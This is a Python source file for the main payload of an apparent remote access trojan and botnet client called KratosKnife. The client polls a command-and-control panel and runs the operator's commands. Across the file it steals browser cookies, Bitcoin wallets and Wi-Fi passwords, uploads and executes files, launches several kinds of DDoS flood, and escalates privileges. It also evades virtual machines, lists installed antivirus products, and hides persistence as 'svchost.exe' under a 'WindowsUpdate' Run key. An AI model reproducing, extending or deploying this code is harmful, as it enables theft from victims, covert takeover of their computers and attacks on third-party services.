import requests, base64, os, time, subprocess, hashlib, re, shutil, sys, webbrowser
import ctypes   #To find user privileges i.e. User/Administrator
import tempfile # Used to find temp directory pathimport webbrowser  # To open Attacker Website in Browser 
from mss import mss   # To capture screenshot

from BypassVM import BypassVM  # Used to Execute Clients CMD
from ClientsCMD import ClientsCMD  # Used to Check For VM
from ComputerCMD import ComputerCMD # User to Execute Computer CMD 
from DDOS import DDOS              # User to Execute DDOS CMD
from HTTPSocket import HTTPSocket  # Used to Make Connection With C&C
from Stealer import Stealer        # User to Execute Stealer CMD   
 
class Payload:
    def __init__(self, panelURL, interval=4):
        self.Y = "|BN|"                        # Delimiter; used to break RECIEVED COMMAND into LIST OF COMMAND 
        self.panelURL = panelURL               # C&C Panel URL
        self.interval = interval               # Interval for C2 polling
        self.machineID = self.gen_machine_id()   # Generates Machine ID of Victim's Device
        self.username = os.getenv("USERNAME")  # Retrives Username of Victim's Device
        self.operatingSystem = self.find_operating_system()   # Find OperatingSystem of Victim
        self.tempdir = tempfile.gettempdir()
        
        self.params_for_getCommand = { 'id' : base64.b64encode(self.machineID.encode('UTF-8'))}

        self.C = HTTPSocket(self.panelURL, self.machineID)   # Initiate HTTPSocket Class
        self.Stealer = Stealer(self.panelURL, self.machineID)         # Initiate Stealer Class
        self.DDOS = DDOS(self.panelURL, self.machineID)               # Initiate DDOS Class        
        self.ClientsCMD = ClientsCMD(self.panelURL, self.machineID)   # Initiate ClientsCMD Class
        self.ComputerCMD = ComputerCMD(self.panelURL, self.machineID) # Initiate ComputerCMD Class

    def detect_vm_and_quit(self):
        checkVM = BypassVM()
        checkVM.registry_check()
        checkVM.processes_and_files_check()
        checkVM.mac_check()            

    def become_persistent(self, time_persistent):
        evil_file_location = os.path.join(os.environ["appdata"], "svchost.exe")
        persistence_registry_name = "WindowsUpdate"
        
        persistenceCMD = f"REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{evil_file_location}\""
        
        if not os.path.exists(evil_file_location):
            cmd = persistenceCMD
            time.sleep(time_persistent) # Delays before copying the file and setting persistence
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)


    def gen_machine_id(self):
        current_machine_id = subprocess.check_output('wmic csproduct get uuid', creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
        m = hashlib.md5()
        m.update(current_machine_id.encode('UTF-8'))
        unique_md5_hash = m.hexdigest()
        return unique_md5_hash   #Machine ID  
        
    def find_operating_system(self):
        if os.name == "posix":
            operatingSystem = "GNU/LINUX"
        elif os.name == 'nt':
            operatingSystem = "Microsoft Windows"
        else:
            operatingSystem = "MacOS" 
        return operatingSystem
        
    def find_antivirus(self):
        command_to_find_AV = "WMIC /Node:localhost /Namespace:\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"
        AV_List = "Unknown"
        try:
            # Use errors='ignore' for robustness against non-UTF-8 characters in WMIC output
            output = subprocess.check_output(command_to_find_AV, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode(encoding="utf-8", errors="ignore").strip()
            AV_name_matches = re.findall("(?:displayName=)(.*)", output)
            if AV_name_matches:
                AV_List = AV_name_matches[0].strip()
            else:
                AV_List = "None Found"
        except Exception:
            AV_List = "Error Retrieving"
        return AV_List
        
    def find_user_privilege(self):
        user_status = ctypes.windll.shell32.IsUserAnAdmin()
        if user_status == 0:
            privilege = "User"
        elif user_status == 1:
            privilege = "Administrator"
        
        return privilege        

    def connect(self):
        Y               = str(self.Y)
        VictimID        = str(self.machineID)
        ComputerName    = str(self.username)
        OperatingSystem = str(self.operatingSystem)
        Antivirus       = str(self.find_antivirus())
        Status          = "Online"
        IsUSB           = "No" 
        IsAdmin         = str(self.find_user_privilege())
        
        data = VictimID + Y + ComputerName + Y + OperatingSystem + Y + Antivirus + Y + Status + Y + IsUSB + Y + IsAdmin
        self.C.Connect(data)  

    def start(self):        
        while True: # Changed from status = True to infinite loop for continuous operation
            try:
                commands_response = requests.get(f"{self.panelURL}getCommand.php", params=self.params_for_getCommand, timeout=15) # Added timeout
                commands_response_text = commands_response.text.strip()

                if not commands_response_text:
                    self.C.Send("CleanCommands") # Clear any potential stale commands
                    time.sleep(self.interval)
                    continue # No command received, continue loop

                try:
                    decoded_command = base64.b64decode(commands_response_text + "==").decode('utf-8')
                    split_command = decoded_command.split(self.Y)
                except Exception as e: 
                    # print(f"[Error] Failed to decode command: {e}") # Removed for stealth
                    self.C.Log("Fail", f"Failed to decode command: {e}")
                    self.C.Send("CleanCommands")
                    time.sleep(self.interval)
                    continue # Skip to next iteration if decoding fails
                
                # print(f"[*] Recived Command List : {split_command}") # Removed for stealth

                #=============================================================================================
                # Below Codes to Checks for "Clients Commands" Section CMD One-By-One 
                #=============================================================================================

                if split_command[0] == '':
                    self.C.Send("CleanCommands")

                elif split_command[0] == "Ping": 
                    self.C.Log("Succ", "Pinged successfully") 
                    self.C.Send("CleanCommands") 
                    
                elif split_command[0] == "UploadFile":    
                    self.ClientsCMD.upload_and_execute_file(split_command[1], split_command[2])  

                elif split_command[0] == "ShowMessageBox":
                    msg        = split_command[1]
                    title      = split_command[2]
                    iconType   = split_command[3]
                    buttonType = split_command[4]
                    self.ClientsCMD.show_message_box(msg, title, iconType, buttonType)
                    
                elif split_command[0] == "Screenshot":
                    self.ClientsCMD.take_screenshot()

                elif split_command[0] == "InstalledSoftwares":
                    self.ClientsCMD.get_program_list()  

                elif split_command[0] == "ExecuteScript":
                    script_type = split_command[1] 
                    script_name = split_command[2] 
                    self.ClientsCMD.execute_script(script_type, script_name)
                
                elif split_command[0] == "Elevate":
                    try:
                        # print("[*] Elevating USER Status ...") # Removed for stealth
                        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                        self.C.Log("Succ", "Elevated USER Status Successfully")
                        self.C.Send("CleanCommands")   
                        sys.exit() # Exit the current process, the elevated one will continue
                    except Exception as e:
                        # print("[Error In KratosKnife, Elevate CMD]") # Removed for stealth
                        # print(f"[Error] : {e}") # Removed for stealth
                        self.C.Log("Fail", "An unexpected error occurred " + str(e)) 
                
                elif split_command[0] == "CleanTemp":
                    self.ClientsCMD.clear_temp_directory()                

                #=============================================================================================
                # Below Codes to Checks for "Location" Section CMD One-By-One 
                #=============================================================================================
                
                elif split_command[0] == "GetLocation":
                    self.ClientsCMD.get_device_location()                

                #=============================================================================================
                # Below Codes to Checks for "Stealer" Section CMD One-By-One 
                #=============================================================================================
                
                elif split_command[0] == "StealChCookies":
                    self.Stealer.steal_chrome_cookie()
                    
                elif split_command[0] == "StealCookie":
                    self.Stealer.steal_firefox_cookie()
                    
                elif split_command[0] == "StealBitcoin":
                    self.Stealer.steal_bitcoin_wallet()
                        
                elif split_command[0] == "StealWifiPassword":
                    self.Stealer.steal_wifi_password()

                #=============================================================================================
                # Below Codes to Checks for "Open Webpage" Section CMD One-By-One
                #=============================================================================================
                            
                elif split_command[0] == "OpenPage":
                    # print(f"[*] Opening Website : {split_command[1]}") # Removed for stealth
                    try:
                        webbrowser.open(split_command[1])            
                        self.C.Send("CleanCommands")
                        self.C.Log("Succ", "Webpage has been opened in visable mode")
                    except Exception as e:
                        # print("[Error In KratosKnife, OpenPage CMD]") # Removed for stealth
                        # print(f"Error : {e}") # Removed for stealth
                        self.C.Log("Fail", "An unexpected error occurred " + str(e)) 

                #=============================================================================================
                # Below Codes to Checks for "DDOS Attack" Section CMD One-By-One
                #=============================================================================================
             
                elif split_command[0] == "StartDDOS":
                    target_host         = split_command[2]
                    thread_number       = split_command[3]
                    max_timeout_number  = split_command[4]
                
                    if split_command[1] == "UDPAttack":
                        self.DDOS.UDP_attack(target_host, thread_number, max_timeout_number)                
                        
                    elif split_command[1] == "TCPAttack":
                        self.DDOS.TCP_attack(target_host, thread_number, max_timeout_number)
                        
                    elif split_command[1] == "ARMEAttack":
                        self.DDOS.ARME_attack(target_host, thread_number, max_timeout_number)
                        
                    elif split_command[1] == "SlowlorisAttack":
                        self.DDOS.Slowloris_attack(target_host, thread_number, max_timeout_number)                
                        
                    elif split_command[1] == "PostHTTPAttack":
                        self.DDOS.PostHTTP_attack(target_host, thread_number, max_timeout_number)
                        
                    elif split_command[1] == "HTTPGetAttack":
                        self.DDOS.HTTPGet_attack(target_host, thread_number, max_timeout_number)
                        
                    elif split_command[1] == "BWFloodAttack":
                        self.DDOS.BandwidthFlood_attack(target_host, thread_number, max_timeout_number)

                #=============================================================================================
                # Below Codes to Checks for "Computer Commands" Section CMD One-By-One
                #=============================================================================================
                elif split_command[0] == "Shutdown":
                    self.ComputerCMD.shutdown()

                elif split_command[0] == "Logoff":
                    self.ComputerCMD.logoff()
                    
                elif split_command[0] == "Restart":
                    self.ComputerCMD.restart()
                 
                #=============================================================================================
                # Below Codes to Checks for "Clients Commands" Section CMD One-By-One 
                #=============================================================================================
     
                elif split_command[0] == "Close":
                    self.ClientsCMD.close_connection()
                    sys.exit()
                    
                elif split_command[0] == "MoveClient":
                    # Normalize the new panel URL to ensure consistent formatting
                    newPanelURL = split_command[1]
                    if newPanelURL and newPanelURL[-1] != "/":
                        newPanelURL = newPanelURL + "/"
                    if newPanelURL and newPanelURL[:7] != "http://" and newPanelURL[:8] != "https://":
                        newPanelURL = "http://" + newPanelURL
                    
                    # Update the main panel URL attribute
                    self.panelURL = newPanelURL
                    
                    # Reinitialize the HTTPSocket and all dependent command classes
                    self.C = HTTPSocket(self.panelURL, self.machineID)
                    self.Stealer = Stealer(self.panelURL, self.machineID)
                    self.DDOS = DDOS(self.panelURL, self.machineID)
                    self.ClientsCMD = ClientsCMD(self.panelURL, self.machineID)
                    self.ComputerCMD = ComputerCMD(self.panelURL, self.machineID)
                    
                    # Log the successful move and clean commands on the new panel
                    self.C.Log("Succ", f"Client successfully moved to new panel: {newPanelURL}")
                    self.C.Send("CleanCommands")

                elif split_command[0] == "Blacklist":
                    self.C.Send("CleanCommands")
                    
                elif split_command[0] == "UpdateClient":
                    self.C.Send("CleanCommands")
                    
                elif split_command[0] == "RestartClient": # Renamed to avoid ambiguity with ComputerCMD.Restart
                    # Placeholder for restarting the client application logic
                    self.C.Log("Succ", "Client restart command received.")
                    self.C.Send("CleanCommands")
                    # Add actual client restart logic here if needed (e.g., re-execute self, then sys.exit())
     
                elif split_command[0] == "Uninstall":
                    self.C.Send("Uninstall")
                    sys.exit()

            except requests.exceptions.ConnectionError:
                # print("[*] Offline, Trying to Connection After 10 Sec") # Removed for stealth
                time.sleep(10) # Wait before retrying connection
            except requests.exceptions.RequestException as e:
                # print(f"[Error] : {e}") # Removed for stealth
                self.C.Log("Fail", f"An unexpected request error occurred: {e}")
                sys.exit() # Exit on other, potentially unrecoverable, request errors
            except KeyboardInterrupt:
                sys.exit() # Ensure graceful exit on Ctrl+C during development
            except Exception as e:
                # General catch-all for other unexpected errors in the command loop
                self.C.Log("Fail", f"An unexpected error in command loop: {e}")
                self.C.Send("CleanCommands") # Attempt to clean commands even on unexpected errors
                time.sleep(self.interval) # Wait before next poll
            
            time.sleep(self.interval) # Poll C2 every 'interval' seconds
        
if __name__ == '__main__':
    def payload_entry_point(): # Renamed the recursive function
        while True:
            try:
                test = Payload("http://localhost/BPanel/", interval=5) # Example URL and interval
                test.detect_vm_and_quit()
                #test.become_persistent(10) #Takes Time In Seconds after which it executes persistence method
                test.connect()
                test.start() 
            except requests.exceptions.ConnectionError:
                # print("[*] Offline, Trying to Connection After 10 Sec") # Removed for stealth
                time.sleep(10)
            except requests.exceptions.RequestException as e: # Catch specific request exceptions
                # print(f"[Error] : {e}") # Removed for stealth
                sys.exit()
            except KeyboardInterrupt:
                sys.exit() # Ensure graceful exit on Ctrl+C during development
            except Exception as e:
                print(f"An unhandled error occurred in main loop: {e}")
                time.sleep(10) # Wait before retrying the entire payload initialization

    payload_entry_point()